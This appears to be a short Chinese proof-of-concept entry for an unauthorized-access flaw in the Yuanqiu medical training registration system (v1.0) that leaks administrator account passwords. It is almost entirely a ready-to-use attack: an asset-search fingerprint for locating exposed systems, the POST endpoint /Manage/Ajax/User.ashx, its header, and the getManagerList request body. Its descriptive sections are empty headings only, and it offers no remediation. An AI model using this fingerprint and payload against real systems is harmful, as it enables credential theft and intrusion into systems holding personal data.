# 远秋医学培训报名系统User存在未授权账号密码泄露漏洞

- **系统**：远秋医学培训报名系统　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`title="医学在线考试系统"`
- **请求**：`POST /Manage/Ajax/User.ashx/ HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`

**请求体 / payload**
```
oper=getManagerList&name=&code=&depart=&page=1&rows=15
>
```

**其他**
- 远秋医学培训报名系统User存在未授权账号密码泄露漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 远秋医学培训报名系统v1.0